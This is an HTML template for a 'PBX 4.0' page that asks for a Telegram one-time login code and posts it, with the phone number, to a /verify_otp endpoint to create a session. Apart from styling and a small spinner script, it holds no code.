<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PBX 4.0 — Enter OTP</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg: #0d0d0d; --card: #161616; --border: #2a2a2a;
      --accent: #7c3aed; --accent2: #a855f7; --text: #f0f0f0;
      --muted: #888; --input-bg: #1e1e1e; --radius: 14px;
    }
    body {
      background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif;
      min-height: 100vh; display: flex; align-items: center;
      justify-content: center; padding: 24px;
    }
    .card {
      background: var(--card); border: 1px solid var(--border);
      border-radius: var(--radius); box-shadow: 0 8px 40px rgba(0,0,0,.55);
      width: 100%; max-width: 420px; padding: 36px 32px 32px; position: relative;
    }
    .card::before {
      content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
      background: linear-gradient(90deg, var(--accent), var(--accent2), #ec4899);
    }
    .icon { font-size: 2.5rem; text-align: center; margin-bottom: 16px; }
    h2 { font-size: 1.3rem; font-weight: 700; margin-bottom: 8px; }
    .subtitle { color: var(--muted); font-size: .87rem; margin-bottom: 28px; line-height: 1.5; }
    .phone-badge {
      display: inline-flex; align-items: center; gap: 6px;
      background: rgba(124,58,237,.12); border: 1px solid rgba(124,58,237,.25);
      color: var(--accent2); border-radius: 8px; padding: 6px 12px;
      font-size: .85rem; font-weight: 500; margin-bottom: 24px;
    }
    label { display: block; font-size: .8rem; font-weight: 500; color: var(--muted); margin-bottom: 7px; }
    input[type="text"] {
      width: 100%; background: var(--input-bg); border: 1px solid var(--border);
      border-radius: 10px; color: var(--text); font-size: 1.1rem; font-family: inherit;
      padding: 13px 16px; outline: none; transition: border-color .2s, box-shadow .2s;
      margin-bottom: 20px; letter-spacing: .15em; text-align: center;
    }
    input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(124,58,237,.2); }
    input::placeholder { color: #444; letter-spacing: 0; }
    .btn {
      display: block; width: 100%; padding: 13px; border: none; border-radius: 10px;
      font-size: .95rem; font-weight: 600; font-family: inherit; cursor: pointer; transition: all .2s;
      background: linear-gradient(135deg, var(--accent), var(--accent2)); color: #fff; margin-bottom: 10px;
    }
    .btn:hover { opacity: .9; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(124,58,237,.4); }
    .btn-ghost {
      background: transparent; border: 1px solid var(--border); color: var(--muted);
    }
    .btn-ghost:hover { border-color: var(--accent); color: var(--accent2); opacity: 1; transform: none; box-shadow: none; }
    .spinner { display: none; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,.3); border-top-color: #fff; border-radius: 50%; animation: spin .7s linear infinite; margin: 0 auto; }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">📲</div>
    <h2>Enter OTP</h2>
    <p class="subtitle">We've sent a one-time code to your Telegram app. Check your Saved Messages or notifications.</p>

    <div class="phone-badge">📞 {{ phone_number }}</div>

    <form action="/verify_otp" method="post" id="otpForm">
      <input type="hidden" name="phone_number" value="{{ phone_number }}" />
      <label for="phone_code">TELEGRAM OTP CODE</label>
      <input
        type="text"
        id="phone_code"
        name="phone_code"
        placeholder="1 2 3 4 5"
        maxlength="10"
        required
        autocomplete="one-time-code"
        inputmode="numeric"
      />
      <button type="submit" class="btn" id="submitBtn">
        <span id="btnText">✅ ᴠᴇʀɪꜰʏ & ᴄʀᴇᴀᴛᴇ sᴇssɪᴏɴ</span>
        <div class="spinner" id="spinner"></div>
      </button>
    </form>

    <a href="/" style="text-decoration:none;">
      <button class="btn btn-ghost">← ʙᴀᴄᴋ</button>
    </a>
  </div>
  <script>
    document.getElementById('otpForm').addEventListener('submit', function () {
      document.getElementById('btnText').style.display = 'none';
      document.getElementById('spinner').style.display = 'block';
      document.getElementById('submitBtn').style.pointerEvents = 'none';
    });
  </script>
</body>
</html>
